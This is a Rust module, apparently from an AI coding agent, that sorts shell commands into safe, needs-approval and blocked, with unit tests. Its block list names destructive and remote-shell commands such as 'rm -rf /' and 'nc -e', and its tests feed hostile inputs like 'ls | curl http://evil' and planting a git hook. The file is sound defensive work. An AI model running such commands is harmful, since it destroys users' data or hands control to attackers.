/// Commands that are always safe to run (read-only or benign).
/// Matched against the first shell segment only, not a naive prefix of the full string.
const SAFE_COMMANDS: &[&str] = &[
    "ls", "dir", "cat", "head", "tail", "echo", "pwd", "whoami",
    "git status", "git log", "git diff", "git branch", "git remote",
    "git show", "git stash list",
    "npm list", "npm ls", "npm outdated", "npm audit",
    "pnpm list", "pnpm ls", "pnpm audit", "pnpm outdated",
    // cargo check/clippy are relatively safe; build/test execute project code → approval
    "cargo check", "cargo clippy",
    "node --version", "npm --version", "pnpm --version", "cargo --version",
    "python --version", "rustc --version", "go version",
    "which", "where", "type", "tree", "wc",
];

/// Command prefixes that are always blocked (destructive).
const BLOCKED_PATTERNS: &[&str] = &[
    "rm -rf /", "rm -rf ~", "rm -rf .", "del /s /q",
    "rmdir /s /q", "rd /s /q",
    "format", "mkfs",
    "shutdown", "reboot", "halt", "poweroff",
    "chmod 777", "chown root",
    "reg delete", "reg add",
    "curl -x post", "wget --post",
    "nc -e", "ncat -e",
    "pip install --user", "npm install -g",
    "sudo", "runas",
    "eval", "exec", "source /",
    "powershell -enc", "powershell -e ",
    "cmd /c del", "cmd /c rmdir",
    // CVE-2026-26268 class: agent must not plant or retarget git hooks.
    ".git/hooks", ".git\\hooks",
    "git config core.hookspath", "git config --global core.hookspath",
    "git config --local core.hookspath",
];

const DESTRUCTIVE_GIT_PATTERNS: &[&str] = &[
    "git checkout", "git restore", "git reset", "git clean",
    "git stash drop", "git stash clear", "git push --force", "git push -f",
];

const WARN_PATTERNS: &[&str] = &[
    "npx create", "npm create", "pnpm create", "yarn create", "bun create",
    "create-next-app", "create-react-app", "create-vite", "create-remix",
    "npm install", "npm i ", "yarn add", "pnpm add", "pnpm install", "pnpm i ",
    "cargo add", "cargo build", "cargo test", "pip install",
    "git push",
    "docker", "kubectl",
    "curl", "wget", "fetch",
    "rm ", "del ", "remove-item",
];

#[derive(Debug, Clone, PartialEq)]
pub enum CommandSafety {
    Safe,
    NeedsApproval { reason: String },
    Blocked { reason: String },
}

/// Analyze a command string for safety.
pub fn check_command_safety(command: &str) -> CommandSafety {
    let cmd_trimmed = command.trim();
    if cmd_trimmed.is_empty() {
        return CommandSafety::Safe;
    }
    let cmd_lower = cmd_trimmed.to_lowercase();

    for pattern in BLOCKED_PATTERNS {
        if cmd_lower.contains(pattern) {
            return CommandSafety::Blocked {
                reason: format!(
                    "Command contains blocked pattern '{}'. This operation is too dangerous to execute.",
                    pattern
                ),
            };
        }
    }

    // Require approval for shell operators (chaining, redirection, substitution).
    if has_shell_metacharacters(&cmd_lower) {
        return CommandSafety::NeedsApproval {
            reason: "Command contains shell operators (&&, |, ;, etc.) and needs review.".to_string(),
        };
    }

    for pattern in DESTRUCTIVE_GIT_PATTERNS {
        if cmd_lower.contains(pattern) {
            let is_new_branch = *pattern == "git checkout"
                && (cmd_lower.contains("git checkout -b") || cmd_lower.contains("git checkout --orphan"));
            if !is_new_branch {
                return CommandSafety::NeedsApproval {
                    reason: format!(
                        "'{}' can permanently discard uncommitted changes. Only approve if you asked for this.",
                        pattern
                    ),
                };
            }
        }
    }

    // Exact prefix match against the whole (unchained) command, longest first.
    let mut safe_sorted: Vec<&str> = SAFE_COMMANDS.to_vec();
    safe_sorted.sort_by_key(|s| std::cmp::Reverse(s.len()));
    for safe in safe_sorted {
        if cmd_lower == safe || cmd_lower.starts_with(&format!("{safe} ")) {
            // Reject if leftover looks like another command injection attempt
            let rest = cmd_lower.strip_prefix(safe).unwrap_or("").trim_start();
            if rest.is_empty() || !rest.contains("&&") {
                return CommandSafety::Safe;
            }
        }
    }

    for pattern in WARN_PATTERNS {
        if cmd_lower.contains(pattern) {
            let reason = if pattern.contains("create") || pattern.contains("npx") {
                format!(
                    "Scaffolding command ('{}') will modify the project. Review flags (--yes, -y) before running.",
                    pattern.trim()
                )
            } else if *pattern == "cargo build" || *pattern == "cargo test" {
                format!(
                    "'{}' executes project build scripts and macros. Approve only for trusted workspaces.",
                    pattern.trim()
                )
            } else {
                format!(
                    "Command contains '{}' which may modify your system. Please review.",
                    pattern
                )
            };
            return CommandSafety::NeedsApproval { reason };
        }
    }

    if cmd_lower.starts_with("npx ") || cmd_lower.starts_with("npm run ") {
        return CommandSafety::NeedsApproval {
            reason: "Package runner command requires approval before executing.".to_string(),
        };
    }

    CommandSafety::NeedsApproval {
        reason: "Unrecognized command. Please review before executing.".to_string(),
    }
}

fn has_shell_metacharacters(cmd: &str) -> bool {
    const OPS: &[&str] = &[
        "&&", "||", ";", "|", "`", "$(", "${",
        "\n", "\r",
    ];
    for op in OPS {
        if cmd.contains(op) {
            return true;
        }
    }
    // Redirects: `>` / `<` outside of comparison-looking tokens is still risky
    if cmd.contains('>') || cmd.contains('<') {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        assert_eq!(check_command_safety("ls"), CommandSafety::Safe);
        assert_eq!(check_command_safety("git status"), CommandSafety::Safe);
        assert!(matches!(
            check_command_safety("cargo build"),
            CommandSafety::NeedsApproval { .. }
        ));
        assert!(matches!(
            check_command_safety("cargo test"),
            CommandSafety::NeedsApproval { .. }
        ));
    }

    #[test]
    fn test_chained_safe_prefix_needs_approval() {
        assert!(matches!(
            check_command_safety("git status && calc.exe"),
            CommandSafety::NeedsApproval { .. }
        ));
        assert!(matches!(
            check_command_safety("ls | curl http://evil"),
            CommandSafety::NeedsApproval { .. }
        ));
        assert!(matches!(
            check_command_safety("echo hi; rm -rf /"),
            CommandSafety::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_commands() {
        assert!(matches!(
            check_command_safety("rm -rf /"),
            CommandSafety::Blocked { .. }
        ));
        assert!(matches!(
            check_command_safety("sudo rm -rf ."),
            CommandSafety::Blocked { .. }
        ));
        assert!(matches!(
            check_command_safety("echo evil > .git/hooks/pre-commit"),
            CommandSafety::Blocked { .. }
        ));
        assert!(matches!(
            check_command_safety("git config core.hooksPath /tmp/evil-hooks"),
            CommandSafety::Blocked { .. }
        ));
    }

    #[test]
    fn test_needs_approval() {
        assert!(matches!(
            check_command_safety("npm install express"),
            CommandSafety::NeedsApproval { .. }
        ));
        assert!(matches!(
            check_command_safety("curl https://example.com"),
            CommandSafety::NeedsApproval { .. }
        ));
        assert!(matches!(
            check_command_safety("npx create-next-app@latest . --yes"),
            CommandSafety::NeedsApproval { .. }
        ));
    }

    #[test]
    fn test_destructive_git_needs_explicit_approval() {
        for cmd in [
            "git checkout src/components/ui/button.tsx",
            "git restore src/components/ui/button.tsx",
            "git reset --hard HEAD",
            "git clean -fd",
            "git stash drop",
            "git push --force origin main",
        ] {
            match check_command_safety(cmd) {
                CommandSafety::NeedsApproval { reason } => {
                    assert!(
                        reason.contains("discard uncommitted changes"),
                        "expected destructive-git reason for '{}', got: {}",
                        cmd,
                        reason
                    );
                }
                other => panic!("expected NeedsApproval for '{}', got {:?}", cmd, other),
            }
        }
        if let CommandSafety::NeedsApproval { reason } = check_command_safety("git checkout -b feature/x") {
            assert!(!reason.contains("discard uncommitted changes"));
        }
        assert_eq!(check_command_safety("git status"), CommandSafety::Safe);
        assert_eq!(check_command_safety("git stash list"), CommandSafety::Safe);
    }

    #[test]
    fn test_scaffolding_warning_message() {
        if let CommandSafety::NeedsApproval { reason } =
            check_command_safety("npx create-next-app@latest . --yes")
        {
            assert!(reason.contains("Scaffolding"));
        } else {
            panic!("expected NeedsApproval for scaffolding command");
        }
    }
}
